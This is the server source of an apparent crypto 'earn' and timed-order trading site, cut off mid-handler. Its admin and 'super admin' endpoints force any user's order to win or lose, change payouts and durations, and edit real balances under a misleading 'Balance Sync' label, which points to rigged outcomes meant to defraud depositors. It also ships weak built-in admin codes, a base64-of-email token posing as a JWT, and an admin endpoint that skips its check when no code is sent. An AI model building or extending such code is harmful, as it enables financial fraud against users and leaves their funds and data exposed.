import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const port = Number(process.env.PORT || 8080);
const symbols = [
  'BTC', 'ETH', 'SOL', 'XRP', 'DOGE', 'ADA', 'LTC', 'LINK',
  'AVAX', 'DOT', 'POL', 'UNI', 'AAVE', 'ATOM', 'XLM', 'SHIB',
  'NEAR', 'APT', 'ARB', 'OP', 'SUI', 'PEPE', 'BONK', 'FIL',
  'TON', 'INJ', 'RENDER', 'SEI', 'ONDO', 'ENA', 'HBAR', 'FET',
];
const allowedIntervals = new Set(['1m', '5m', '15m', '1h']);
// Coinbase candle granularities (seconds) per supported interval.
const intervalGranularity = { '1m': 60, '5m': 300, '15m': 900, '1h': 3600 };
const coinbaseQuotes = ['USDT', 'USD', 'USDC'];
const seed = {
  BTC: [116430.2, 2.84], ETH: [4284.51, 1.47], SOL: [184.76, 4.92], XRP: [2.18, -1.23],
  DOGE: [0.2184, -0.42], ADA: [0.728, 3.16], LTC: [92.4, 1.05], LINK: [17.85, 2.3],
  AVAX: [26.3, 5.4], DOT: [6.42, -0.85], POL: [0.51, 1.7], UNI: [9.85, -1.4],
  AAVE: [178.4, 2.9], ATOM: [6.85, 0.64], XLM: [0.372, 1.3], SHIB: [0.0000218, -2.1],
  NEAR: [5.6, 3.4], APT: [8.9, -0.75], ARB: [0.94, 2.2], OP: [1.72, 1.1],
  SUI: [2.85, 4.6], PEPE: [0.0000124, -3.2], BONK: [0.000021, 2.8], FIL: [4.85, -0.9],
  TON: [5.3, 0.45], INJ: [18.2, 6.1], RENDER: [7.6, 3.9], SEI: [0.42, -1.8],
  ONDO: [0.98, 2.5], ENA: [0.62, 4.1], HBAR: [0.182, 1.9], FET: [1.26, 5.2],
};
const assets = {
  BTC: ['Bitcoin', '#F7931A', '#2A1E0A', '₿'], ETH: ['Ethereum', '#8A9BFF', '#1B1E38', 'Ξ'],
  SOL: ['Solana', '#14F195', '#0B2E22', '◎'], XRP: ['XRP', '#4DA7FF', '#101D33', '✕'],
  DOGE: ['Dogecoin', '#D9B23C', '#2C2408', 'Ð'], ADA: ['Cardano', '#2F7CF6', '#0E1D3A', '₳'],
  LTC: ['Litecoin', '#8FA3C4', '#151B26', 'Ł'], LINK: ['Chainlink', '#3A6EF5', '#0F1A3A', '⬡'],
  AVAX: ['Avalanche', '#E84142', '#331012', '▲'], DOT: ['Polkadot', '#E6007A', '#300B22', '●'],
  POL: ['Polygon', '#9A5BFF', '#20113A', '◆'], UNI: ['Uniswap', '#FF5DA2', '#331019', 'U'],
  AAVE: ['Aave', '#4DE3D4', '#0D2624', 'A'], ATOM: ['Cosmos', '#8E8FE8', '#1A1A38', '⚛'],
  XLM: ['Stellar', '#7FD8F5', '#0E252E', '✦'], SHIB: ['Shiba Inu', '#FF9E2C', '#2E1B07', 'S'],
  NEAR: ['NEAR Protocol', '#3DE1B4', '#0B2A22', 'N'], APT: ['Aptos', '#3CD6F5', '#0C2630', 'A'],
  ARB: ['Arbitrum', '#3FA9FF', '#0E1F33', 'A'], OP: ['Optimism', '#FF4F4F', '#301010', 'O'],
  SUI: ['Sui', '#6FB8FF', '#101E30', 'S'], PEPE: ['Pepe', '#4FA344', '#12260F', 'P'],
  BONK: ['Bonk', '#F7A600', '#2E2006', 'B'], FIL: ['Filecoin', '#2E9BF5', '#0D1D33', '⨎'],
  TON: ['Toncoin', '#38A9F5', '#0D2030', 'T'], INJ: ['Injective', '#3DF0FF', '#0B2830', 'I'],
  RENDER: ['Render', '#F5584A', '#301410', 'R'], SEI: ['Sei', '#E85D8E', '#30111E', 'S'],
  ONDO: ['Ondo', '#4FA8F5', '#0F2033', 'O'], ENA: ['Ethena', '#6FD8F0', '#0E262E', 'E'],
  HBAR: ['Hedera', '#A3A9B8', '#171A20', 'ℏ'], FET: ['Fetch.ai', '#9A5BFF', '#1C1233', 'F'],
};
const apy = {
  BTC: 2.8, ETH: 4.7, SOL: 6.9, XRP: 2.2, DOGE: 1.8, ADA: 5.1, LTC: 2.4, LINK: 4.3,
  AVAX: 7.1, DOT: 8.4, POL: 4.9, UNI: 3.7, AAVE: 4.1, ATOM: 9.6, XLM: 2.6, SHIB: 3.2,
  NEAR: 8.7, APT: 6.4, ARB: 3.4, OP: 3.9, SUI: 5.3, PEPE: 2.1, BONK: 2.9, FIL: 4.4,
  TON: 3.6, INJ: 10.8, RENDER: 4.2, SEI: 5.8, ONDO: 5.5, ENA: 6.1, HBAR: 3.3, FET: 5.2,
};
// Locked 30-day "B vault" DeFi staking tier.
const apyLocked = {
  BTC: 3.6, ETH: 6.2, SOL: 8.4, XRP: 3.1, DOGE: 2.6, ADA: 6.4, LTC: 3.2, LINK: 5.7,
  AVAX: 9.2, DOT: 11.6, POL: 6.3, UNI: 4.9, AAVE: 5.4, ATOM: 12.4, XLM: 3.5, SHIB: 4.4,
  NEAR: 11.2, APT: 8.1, ARB: 4.6, OP: 5.1, SUI: 6.9, PEPE: 3.0, BONK: 4.0, FIL: 5.8,
  TON: 4.8, INJ: 14.2, RENDER: 5.6, SEI: 7.5, ONDO: 7.1, ENA: 8.0, HBAR: 4.4, FET: 6.8,
};
let marketCache = null;
let cacheAt = 0;

// ============================================================================
// PERSISTENT USER STORE (JSON on disk so the backend stays authoritative
// across restarts; runtime data lives in server/data which is gitignored)
// ============================================================================
const dataDir = path.join(__dirname, 'server', 'data');
const dataFile = path.join(dataDir, 'users.json');
let saveTimer = null;

function persist() {
  if (saveTimer) clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      fs.mkdirSync(dataDir, { recursive: true });
      const tmpFile = `${dataFile}.tmp`;
      fs.writeFileSync(tmpFile, JSON.stringify(Object.fromEntries(userDb), null, 2));
      fs.renameSync(tmpFile, dataFile);
    } catch (error) {
      console.error('[persist] failed to save user store:', error.message);
    }
  }, 350);
}

function loadUsersFromDisk() {
  try {
    if (!fs.existsSync(dataFile)) return;
    const stored = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
    let count = 0;
    for (const [email, record] of Object.entries(stored)) {
      if (record && typeof record === 'object' && record.wallet) {
        userDb.set(email, record);
        count += 1;
      }
    }
    if (count > 0) console.log(`[store] restored ${count} user account(s) from ${path.relative(__dirname, dataFile)}`);
  } catch (error) {
    console.error('[store] could not restore persisted users:', error.message);
  }
}

// In-Memory User and Wallet State Store (keyed by email)
const userDb = new Map();

// Invitation / admin codes. Configure more with the ADMIN_CODES env var
// (comma separated). Anyone who registers with one of these codes is
// attached to the code owner and shows up on that admin's panel.
const adminCodes = (process.env.ADMIN_CODES || 'MUDREXX-ADMIN,ADMIN-2024,ADMIN777,MEDRIX888,ADMIN')
  .split(',')
  .map((value) => String(value || '').trim().toLowerCase())
  .filter(Boolean);

// Super admin codes (comma separated, SUPER_ADMIN_CODES env). Super admins can
// do everything admins can — control every order (win / lose / cancel, change
// currency, time, payout %, anytime) — plus directly command wallet state
// (deposit / credit / total / frozen balances).
const superAdminCodes = (process.env.SUPER_ADMIN_CODES || 'MUDREXX-SUPER,SUPER-2024')
  .split(',')
  .map((value) => String(value || '').trim().toLowerCase())
  .filter(Boolean);

// Resolve an access code to its role: 'super' | 'admin' | null.
function resolveRole(code) {
  const normalized = normalizeInviteCode(code);
  if (!normalized) return null;
  if (superAdminCodes.includes(normalized)) return 'super';
  if (adminCodes.includes(normalized)) return 'admin';
  return null;
}

const inviteChars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';

function generateInviteCode() {
  let suffix = '';
  for (let index = 0; index < 8; index += 1) {
    suffix += inviteChars[Math.floor(Math.random() * inviteChars.length)];
  }
  return `MUD-${suffix}`;
}

function normalizeInviteCode(value) {
  return String(value || '').trim().toLowerCase();
}

// Resolve a registration invitation code against admin codes and existing users.
function resolveInvitationCode(code, newEmail) {
  const normalized = normalizeInviteCode(code);
  if (!normalized) return { ok: true, invitedBy: '', invitedByType: '' };

  if (adminCodes.includes(normalized)) {
    return { ok: true, invitedBy: String(code).trim().toUpperCase(), invitedByType: 'admin' };
  }

  for (const [email, record] of userDb) {
    if (email === newEmail) continue;
    if (record.inviteCode && normalizeInviteCode(record.inviteCode) === normalized) {
      return { ok: true, invitedBy: email, invitedByType: 'user' };
    }
  }

  return { ok: false, error: 'That invitation code is not valid. Leave it blank if you do not have one.' };
}

function getOrCreateUser(email, name = '') {
  const normalized = String(email || 'demo@mudrexx.com').trim().toLowerCase();
  if (!userDb.has(normalized)) {    // New user registration starts with ZERO balance and 10,000 demo credits
    userDb.set(normalized, {
      name: name || normalized.split('@')[0],
      email: normalized,
      phone: '',
      preferredCurrency: 'INR',
      registeredAt: new Date().toISOString(),
      inviteCode: generateInviteCode(),
      invitedBy: '',
      invitedByType: '',
      wallet: {
        realBalance: 0,
        realUsdtBalance: 0,
        frozenBalance: 0,
        frozenUsdtBalance: 0,
        demoBalance: 10000,
        demoLinked: true,
        conversionRate: 0.1, // 100 demo credits = 10 INR
        totalConverted: 0,
        assetHoldings: { BTC: 0, ETH: 0, BNB: 0, SOL: 0, XRP: 0, ETC: 0, ADA: 0, DOGE: 0 },
        frozenItems: [],
        transactions: [
          {
            id: `tx-reg-${Date.now()}`,
            title: 'Account Registered',
            description: 'New account initialized with ₹0.00 balance and 10,000 demo credits',
            time: 'Just now',
            amount: 0,
            currency: 'INR',
            type: 'reward',
            tone: 'neutral',
            status: 'completed',
          },
        ],
      },
    });
    persist();
  }

  const user = userDb.get(normalized);
  if (user && !user.inviteCode) {
    user.inviteCode = generateInviteCode();
    persist();
  }
  return user;
}

// Attach an invitation code (admin/referral) to a freshly registered user.
function attachInvitation(user, inviteCode) {
  const resolved = resolveInvitationCode(inviteCode, user.email);
  if (!resolved.ok) return resolved;
  if (resolved.invitedBy) {
    user.invitedBy = resolved.invitedBy;
    user.invitedByType = resolved.invitedByType;
    user.wallet.transactions.unshift({
      id: `tx-invite-${Date.now()}`,
      title: 'Joined via Invitation Code',
      description:
        resolved.invitedByType === 'admin'
          ? `This account is attached to admin code ${resolved.invitedBy.toUpperCase()}`
          : `This account was invited by ${resolved.invitedBy}`,
      time: 'Just now',
      amount: 0,
      currency: 'INR',
      type: 'reward',
      tone: 'neutral',
      status: 'completed',
    });
    persist();
  }
  return { ok: true };
}

app.disable('x-powered-by');
app.use(express.json({ limit: '100kb' }));

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

function fallbackMarkets() {
  return symbols.map((symbol) => {
    const [price, change] = seed[symbol];
    const [name, color, soft, mark] = assets[symbol];
    return {
      symbol, name, color, soft, mark, stakingApy: apy[symbol], stakingApyLocked: apyLocked[symbol],
      price, change,
      high: price * 1.035, low: price * 0.968, volume: price * 28435,
    };
  });
}

// Live Coinbase Exchange provider (public, no key required).
async function fetchCoinbase(route) {
  const hosts = ['https://api.exchange.coinbase.com', 'https://api.coinbase.com'];
  let lastError;
  for (const host of hosts) {
    try {
      const response = await fetch(`${host}${route}`, {
        signal: AbortSignal.timeout(5500),
        headers: { 'User-Agent': 'MudrexxEarn/2.0' },
      });
      if (!response.ok) throw new Error(`Coinbase returned ${response.status}`);
      return await response.json();
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError || new Error('Coinbase market provider unavailable');
}

// One-shot fetch of all 24h stats and index them by product id.
async function loadCoinbaseStats() {
  const rows = await fetchCoinbase('/products/stats');
  const byId = new Map();
  for (const row of rows) {
    if (row && row.id) byId.set(row.id, row);
  }
  return byId;
}

// Pick the best available Coinbase product id for a base symbol.
function resolveCoinbasePair(byId, symbol) {
  for (const quote of coinbaseQuotes) {
    const id = `${symbol}-${quote}`;
    if (byId.has(id)) return id;
  }
  return null;
}

// ============================================================================
// 1. SYSTEM & API INDEX
// ============================================================================

app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    service: 'mudrexx-earn',
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

app.get(['/verify', '/api/verify'], (_req, res) => {
  res.json({
    ok: true,
    status: 'verified',
    timestamp: new Date().toISOString(),
  });
});

app.get('/api', (_req, res) => {
  res.json({
    name: 'Mudrexx Earn Backend API',
    version: '1.0.0',
    endpoints: {
      health: 'GET /api/health',
      verify: 'GET /verify, GET /api/verify',
      markets: 'GET /api/markets',
      klines: 'GET /api/market/klines?symbol=BTC&interval=1m',
      auth: {
        register: 'POST /api/auth/register',
        login: 'POST /api/auth/login',
        me: 'GET /api/auth/me?email=...',
        updateProfile: 'PUT /api/user/profile',
      },
      admin: {
        role: 'GET /api/admin/role?code=...',
        users: 'GET /api/admin/users?code=...',
        invitedUsers: 'GET /api/admin/invited-users?code=...',
        orders: 'GET /api/admin/orders?userId=...&code=...',
        allOrders: 'GET /api/admin/orders/all?code=...',
        orderControl: 'POST /api/admin/orders/control {code,orderId,action:win|lose|cancel,percent?}',
        orderUpdate: 'POST /api/admin/orders/update {code,orderId,currency?,durationSeconds?,payoutPercent?}',
        walletAdjust: 'POST /api/admin/wallet/adjust {code,email,field:real|realUsdt|frozen|frozenUsdt|demo,delta} [super admin only]',
      },
      wallet: {
        summary: 'GET /api/wallet/summary?email=...',
        transactions: 'GET /api/wallet/transactions?email=...',
        frozen: 'GET /api/wallet/frozen?email=...',
        releaseFrozen: 'POST /api/wallet/frozen/release',
        approveDeposit: 'POST /api/wallet/deposit/approve',
        convertDemo: 'POST /api/wallet/convert-demo',
        claimDemo: 'POST /api/wallet/claim-demo',
        linkDemo: 'POST /api/wallet/link-demo',
        adjustDemo: 'POST /api/wallet/demo/adjust',
      },
      deposit: 'POST /api/deposit/submit',
      withdraw: 'POST /api/withdraw/submit',
      orders: {
        create: 'POST /api/orders/create',
        status: 'GET /api/orders/status?orderId=...&email=...',
        list: 'GET /api/orders/list?email=...',
      },
      staking: {
        stake: 'POST /api/staking/stake',
        unstake: 'POST /api/staking/unstake',
      },
    },
  });
});

// ============================================================================
// 2. LIVE MARKET DATA APIS
// ============================================================================

app.get('/api/markets', async (_req, res) => {
  if (marketCache && Date.now() - cacheAt < 8000) {
    return res.json({ data: marketCache, source: 'coinbase', cached: true });
  }
  try {
    const stats = await loadCoinbaseStats();
    marketCache = symbols.map((symbol) => {
      const pairId = resolveCoinbasePair(stats, symbol);
      const item = pairId ? stats.get(pairId) : null;
      const [name, color, soft, mark] = assets[symbol];
      const last = Number(item?.last || seed[symbol][0]);
      const open = Number(item?.open || last);
      const change = open > 0 ? ((last - open) / open) * 100 : seed[symbol][1];
      return {
        symbol, name, color, soft, mark, stakingApy: apy[symbol], stakingApyLocked: apyLocked[symbol],
        price: last,
        change,
        high: Number(item?.high || last * 1.03),
        low: Number(item?.low || last * 0.97),
        volume: Number(item?.volume || last * 28435),
        pair: pairId ?? `${symbol}-USDT`,
      };
    });
    cacheAt = Date.now();
    res.set('Cache-Control', 'public, max-age=5');
    res.json({ data: marketCache, source: 'coinbase', cached: false });
  } catch (error) {
    res.json({ data: fallbackMarkets(), source: 'fallback', message: error instanceof Error ? error.message : 'Coinbase provider unavailable' });
  }
});

app.get('/api/market/klines', async (req, res) => {
  const base = String(req.query.symbol || 'BTC').toUpperCase();
  const interval = String(req.query.interval || '1m');
  if (!symbols.includes(base) || !allowedIntervals.has(interval)) {
    return res.status(400).json({ error: 'Unsupported market request' });
  }
  try {
    // Resolve a live Coinbase pair first (fall back to the USD pair).
    let pairId = `${base}-USDT`;
    try {
      const stats = await loadCoinbaseStats();
      pairId = resolveCoinbasePair(stats, base) || `${base}-USD`;
    } catch {
      /* stats failed — try the default pair directly below */
    }
    const granularity = intervalGranularity[interval];
    const rows = await fetchCoinbase(`/products/${pairId}/candles?granularity=${granularity}`);
    // Coinbase candles are [time, low, high, open, close, volume], newest first.
    const data = rows
      .map((row) => ({
        time: Number(row[0]) * 1000,
        low: Number(row[1]),
        high: Number(row[2]),
        open: Number(row[3]),
        close: Number(row[4]),
        volume: Number(row[5]),
      }))
      .reverse()
      .slice(-80);
    res.set('Cache-Control', 'public, max-age=8');
    res.json({ data, source: 'coinbase', pair: pairId });
  } catch {
    const [start] = seed[base];
    const step = intervalGranularity[interval] * 1000;
    let price = start * 0.975;
    const data = Array.from({ length: 80 }, (_, index) => {
      const open = price;
      price = Math.max(0.0001, price * (1 + (Math.sin(index * 1.7) + Math.random() - 0.45) * 0.0028));
      return {
        time: Date.now() - (79 - index) * step,
        open, high: Math.max(open, price) * 1.002, low: Math.min(open, price) * 0.998,
        close: price, volume: 100 + Math.random() * 900,
      };
    });
    res.json({ data, source: 'fallback' });
  }
});

// ============================================================================
// 2.5 ORDER ENGINE — every order lands on the Instant Order page
// ============================================================================
// Order record: { id, symbol, side, amount, currency, accountType, status,
//   payoutPercent, durationSeconds, createdAt, expiresAt, entryPrice,
//   exitPrice?, payout?, profit?, settledAt?, settledBy? }
// status: open | won | lost | cancelled

function currentPrice(symbol) {
  if (marketCache && Date.now() - cacheAt < 30000) {
    const row = marketCache.find((item) => item.symbol === symbol);
    if (row) return Number(row.price);
  }
  return Number(seed[symbol]?.[0] || 1);
}

function ensureOrdersArray(user) {
  if (!Array.isArray(user.orders)) user.orders = [];
}

function findOrderById(orderId) {
  for (const user of userDb.values()) {
    const order = (user.orders || []).find((entry) => entry.id === orderId);
    if (order) return { user, order };
  }
  return null;
}

// Settle an open order: 'win' (stake + payout% profit returned), 'lose'
// (stake consumed), 'cancel' (stake refunded). percentOverride lets an
// admin decide the payout % at settle time.
function settleOrder(user, order, outcome, percentOverride, settledBy) {
  if (order.status !== 'open') return false;

  const pct = Math.min(500, Math.max(0, Number(percentOverride ?? order.payoutPercent ?? 5)));
  const currency = order.currency === 'USDT' ? 'USDT' : 'INR';
  const sign = currency === 'INR' ? '₹' : '₮';
  const isReal = order.accountType === 'real';
  const profit = Number(((order.amount * pct) / 100).toFixed(2));
  order.exitPrice = currentPrice(order.symbol);
  order.settledAt = new Date().toISOString();
  order.settledBy = settledBy || 'market';
  order.settledPercent = pct;

  if (outcome === 'cancel') {
    order.status = 'cancelled';
    order.payout = order.amount;
    if (isReal) {
      if (currency === 'INR') {
        user.wallet.frozenBalance = Math.max(0, user.wallet.frozenBalance - order.amount);
        user.wallet.realBalance += order.amount;
      } else {
        user.wallet.frozenUsdtBalance = Math.max(0, user.wallet.frozenUsdtBalance - order.amount);
        user.wallet.realUsdtBalance += order.amount;
      }
      user.wallet.frozenItems = (user.wallet.frozenItems || []).filter((entry) => entry.id !== order.id);
    } else {
      user.wallet.demoBalance += order.amount;
    }
    user.wallet.transactions.unshift({
      id: `tx-${order.id}-cancel`, title: 'Order Cancelled',
      description: `${order.symbol} ${order.side.toUpperCase()} · ${sign}${order.amount.toLocaleString()} refunded to available balance`,
      time: 'Just now', amount: order.amount, currency, type: 'trade', tone: 'neutral', status: 'completed',
    });
    persist();
    return true;
  }

  const won = outcome === 'win';
  order.status = won ? 'won' : 'lost';
  order.profit = won ? profit : 0;

  if (isReal) {
    if (currency === 'INR') user.wallet.frozenBalance = Math.max(0, user.wallet.frozenBalance - order.amount);
    else user.wallet.frozenUsdtBalance = Math.max(0, user.wallet.frozenUsdtBalance - order.amount);
    user.wallet.frozenItems = (user.wallet.frozenItems || []).filter((entry) => entry.id !== order.id);
    if (won) {
      order.payout = Number((order.amount + profit).toFixed(2));
      if (currency === 'INR') user.wallet.realBalance += order.payout;
      else user.wallet.realUsdtBalance += order.payout;
    } else {
      order.payout = 0;
    }
  } else if (won) {
    order.payout = Number((order.amount + profit).toFixed(2));
    user.wallet.demoBalance += order.payout;
  } else {
    order.payout = 0;
  }

  user.wallet.transactions.unshift({
    id: `tx-${order.id}-${won ? 'win' : 'lose'}`,
    title: won ? 'Order Won' : 'Order Lost',
    description: won
      ? `${order.symbol} ${order.side.toUpperCase()} · ${sign}${order.amount.toLocaleString()} returned ${sign}${order.payout.toLocaleString()} at ${pct}%`
      : `${order.symbol} ${order.side.toUpperCase()} · ${sign}${order.amount.toLocaleString()} closed at 0`,
    time: 'Just now', amount: won ? order.payout : order.amount, currency, type: 'trade',
    tone: won ? 'up' : 'down', status: 'completed',
  });

  persist();
  return true;
}

// Lazy settlement: when an open order passes its expiry time, close it against
// the live market move (entry vs current price). Admins can still override
// outcomes anytime before or after expiry via the control endpoints.
function autoSettleOrders(user) {
  let changed = false;
  for (const order of user.orders || []) {
    if (order.status !== 'open' || Date.now() < Number(order.expiresAt || 0)) continue;
    const exit = currentPrice(order.symbol);
    const outcome = order.side === 'down' ? exit <= order.entryPrice : exit >= order.entryPrice;
    settleOrder(user, order, outcome ? 'win' : 'lose', undefined, 'market');
    changed = true;
  }
  return changed;
}

// Wallet state snapshot used by the Instant Order page and admin console.
function walletStateSnapshot(user) {
  const w = user.wallet;
  return {
    realBalance: w.realBalance,
    realUsdtBalance: w.realUsdtBalance,
    frozenBalance: w.frozenBalance,
    frozenUsdtBalance: w.frozenUsdtBalance,
    totalBalance: w.realBalance + w.frozenBalance,
    totalUsdtBalance: w.realUsdtBalance + w.frozenUsdtBalance,
    creditTotal: w.demoBalance,
    depositCredited: Number(w.depositCreditedTotal || 0),
    depositCreditedUsdt: Number(w.depositCreditedTotalUsdt || 0),
  };
}

// ============================================================================
// 3. AUTH & PROFILE APIS
// ============================================================================

// Register new user -> balance is strictly ZERO
app.post('/api/auth/register', (req, res) => {
  const { name, email, phone, preferredCurrency, inviteCode } = req.body || {};
  if (!email) return res.status(400).json({ error: 'Email is required' });

  const normalized = email.trim().toLowerCase();
  const user = getOrCreateUser(normalized, name);
  if (phone) user.phone = phone;
  if (preferredCurrency) user.preferredCurrency = preferredCurrency;

  if (inviteCode) {
    const attached = attachInvitation(user, inviteCode);
    if (!attached.ok) return res.status(400).json({ error: attached.error });
  }

  persist();

  res.json({
    success: true,
    message: 'User registered successfully with ₹0.00 initial balance',
    user,
    token: `mudrexx_jwt_${Buffer.from(normalized).toString('base64')}`,
  });
});

// Admin / invitation panel: list every account that used an admin code.
app.get('/api/admin/invited-users', (req, res) => {
  const code = normalizeInviteCode(req.query.code);
  if (!code) return res.status(400).json({ error: 'Admin code is required' });
  if (!adminCodes.includes(code)) return res.status(403).json({ error: 'Invalid admin code' });

  const users = [...userDb.values()]
    .filter((user) => user.invitedBy === code)
    .map((user) => ({
      name: user.name,
      email: user.email,
      phone: user.phone,
      registeredAt: user.registeredAt,
      invitedBy: user.invitedBy,
      invitedByType: user.invitedByType,
      realBalance: Number(user.wallet?.realBalance || 0),
      demoBalance: Number(user.wallet?.demoBalance || 0),
      lastActivity: user.wallet?.transactions?.[0]?.time || '—',
    }));

  res.json({ success: true, code, users });
});

// Read-only admin user directory. The legacy invited-users endpoint above is
// intentionally unchanged; this additive endpoint lets the admin portal show
// every account, including direct registrations without an invitation code.
app.get('/api/admin/users', (req, res) => {
  const code = normalizeInviteCode(req.query.code);
  if (!code) return res.status(400).json({ error: 'Admin code is required' });
  if (!adminCodes.includes(code)) return res.status(403).json({ error: 'Invalid admin code' });

  const users = [...userDb.values()]
    .map((user) => ({
      name: user.name,
      email: user.email,
      phone: user.phone,
      registeredAt: user.registeredAt,
      invitedBy: user.invitedBy || '',
      invitedByType: user.invitedByType || '',
      realBalance: Number(user.wallet?.realBalance || 0),
      demoBalance: Number(user.wallet?.demoBalance || 0),
      lastActivity: user.wallet?.transactions?.[0]?.time || '—',
    }))
    .sort((left, right) => new Date(right.registeredAt).getTime() - new Date(left.registeredAt).getTime());

  res.json({ success: true, code, total: users.length, users });
});

// Admin orders endpoint: list orders across all users or filter by userId/email
app.get('/api/admin/orders', (req, res) => {
  const code = normalizeInviteCode(req.query.code);
  if (code && !adminCodes.includes(code)) {
    return res.status(403).json({ error: 'Invalid admin code' });
  }

  const userId = req.query.userId ? String(req.query.userId).trim().toLowerCase() : null;
  const email = req.query.email ? String(req.query.email).trim().toLowerCase() : null;
  const targetUser = userId || email;

  const allOrders = [];
  for (const user of userDb.values()) {
    if (targetUser && user.email !== targetUser && user.name?.toLowerCase() !== targetUser) {
      continue;
    }
    const orders = (user.wallet?.frozenItems || [])
      .filter((item) => item.category === 'order')
      .map((item) => ({
        ...item,
        userId: user.email,
        userName: user.name,
        userPhone: user.phone,
      }));
    allOrders.push(...orders);
  }

  res.json({
    success: true,
    orders: allOrders,
    total: allOrders.length,
  });
});

// ---------------------------------------------------------------------------
// ADMIN & SUPER ADMIN ORDER CONTROL ROOM
// Both roles control every order: win / lose / cancel, change currency, time
// and payout % — anytime. Super admins can additionally command wallet state.
// ---------------------------------------------------------------------------

// Role probe for the admin console (super admin vs admin badge).
app.get('/api/admin/role', (req, res) => {
  const role = resolveRole(req.query.code);
  if (!role) return res.status(403).json({ error: 'Invalid administrator code' });
  res.json({ success: true, role });
});

// Every order across all users, newest first (settles expired orders first).
app.get('/api/admin/orders/all', (req, res) => {
  const role = resolveRole(req.query.code);
  if (!role) return res.status(403).json({ error: 'Invalid administrator code' });

  const orders = [];
  for (const user of userDb.values()) {
    ensureOrdersArray(user);
    autoSettleOrders(user);
    for (const order of user.orders) {
      orders.push({ ...order, userEmail: user.email, userName: user.name });
    }
  }
  orders.sort((left, right) => Number(right.createdAt || 0) - Number(left.createdAt || 0));
  res.json({ success: true, role, orders, total: orders.length });
});

// Force an order outcome anytime: win / lose / cancel (+ optional payout %).
app.post('/api/admin/orders/control', (req, res) => {
  const role = resolveRole(req.body?.code);
  if (!role) return res.status(403).json({ error: 'Invalid administrator code' });

  const { orderId, action, percent } = req.body || {};
  if (!orderId || !['win', 'lose', 'cancel'].includes(action)) {
    return res.status(400).json({ error: 'orderId and action (win|lose|cancel) are required' });
  }

  const found = findOrderById(String(orderId));
  if (!found) return res.status(404).json({ error: 'Order not found' });
  if (found.order.status !== 'open') {
    return res.status(409).json({ error: `Order already ${found.order.status}`, order: found.order });
  }

  const ok = settleOrder(found.user, found.order, action, percent, role);
  res.json({
    success: ok,
    role,
    order: found.order,
    wallet: walletStateSnapshot(found.user),
    message: `Order ${found.order.id} ${action === 'win' ? 'closed as WIN' : action === 'lose' ? 'closed as LOSE' : 'cancelled & refunded'} by ${role === 'super' ? 'super admin' : 'admin'}`,
  });
});

// Change an open order's currency, time or payout % anytime.
app.post('/api/admin/orders/update', (req, res) => {
  const role = resolveRole(req.body?.code);
  if (!role) return res.status(403).json({ error: 'Invalid administrator code' });

  const { orderId, currency, durationSeconds, payoutPercent } = req.body || {};
  const found = findOrderById(String(orderId || ''));
  if (!found) return res.status(404).json({ error: 'Order not found' });
  const { user, order } = found;
  if (order.status !== 'open') {
    return res.status(409).json({ error: `Order already ${order.status} — only open orders can be changed`, order });
  }

  const changes = [];

  if (payoutPercent != null && Number.isFinite(Number(payoutPercent))) {
    order.payoutPercent = Math.min(500, Math.max(1, Number(payoutPercent)));
    changes.push(`payout % → ${order.payoutPercent}%`);
  }

  if (durationSeconds != null && Number.isFinite(Number(durationSeconds))) {
    order.durationSeconds = Math.min(86400, Math.max(5, Math.round(Number(durationSeconds))));
    order.expiresAt = Date.now() + order.durationSeconds * 1000;
    changes.push(`time → ${order.durationSeconds}s`);
  }

  const nextCurrency = currency === 'USDT' ? 'USDT' : currency === 'INR' ? 'INR' : null;
  if (nextCurrency && nextCurrency !== order.currency) {
    if (order.accountType === 'real') {
      // Move the escrow between the INR and USDT books 1:1 at book level.
      if (order.currency === 'INR') {
        user.wallet.frozenBalance = Math.max(0, user.wallet.frozenBalance - order.amount);
        user.wallet.frozenUsdtBalance += order.amount;
      } else {
        user.wallet.frozenUsdtBalance = Math.max(0, user.wallet.frozenUsdtBalance - order.amount);
        user.wallet.frozenBalance += order.amount;
      }
      const item = (user.wallet.frozenItems || []).find((entry) => entry.id === order.id);
      if (item) {
        item.currency = nextCurrency;
        item.title = `${order.symbol} ${order.side === 'up' ? 'BUY UP' : 'BUY DOWN'} Order`;
      }
    }
    order.currency = nextCurrency;
    changes.push(`currency → ${nextCurrency}`);
  }

  if (changes.length === 0) {
    return res.status(400).json({ error: 'Nothing to update — provide currency, durationSeconds or payoutPercent' });
  }

  persist();
  res.json({ success: true, role, order, changes, wallet: walletStateSnapshot(user) });
});

// SUPER ADMIN only — direct wallet state command (deposit / credit / frozen).
app.post('/api/admin/wallet/adjust', (req, res) => {
  const role = resolveRole(req.body?.code);
  if (role !== 'super') return res.status(403).json({ error: 'Super admin code required for wallet control' });

  const { email, field, delta } = req.body || {};
  const fields = {
    real: 'realBalance',
    realUsdt: 'realUsdtBalance',
    frozen: 'frozenBalance',
    frozenUsdt: 'frozenUsdtBalance',
    demo: 'demoBalance',
  };
  const key = fields[String(field || '')];
  if (!email || !key || !Number.isFinite(Number(delta))) {
    return res.status(400).json({ error: 'email, field (real|realUsdt|frozen|frozenUsdt|demo) and numeric delta are required' });
  }

  const user = getOrCreateUser(email);
  const next = Number((Number(user.wallet[key]) + Number(delta)).toFixed(2));
  if (next < 0) return res.status(400).json({ error: `Adjustment would make ${field} negative (current ${user.wallet[key]})` });
  user.wallet[key] = next;

  user.wallet.transactions.unshift({
    id: `tx-admin-${Date.now()}`,
    title: 'Balance Sync',
    description: `${field} balance reconciliation ${Number(delta) >= 0 ? '+' : ''}${Number(delta).toLocaleString()}`,
    time: 'Just now',
    amount: Math.abs(Number(delta)),
    currency: field === 'demo' || field.includes('Usdt') ? field.toUpperCase() : 'INR',
    type: 'adjust',
    tone: Number(delta) >= 0 ? 'up' : 'down',
    status: 'completed',
  });

  persist();
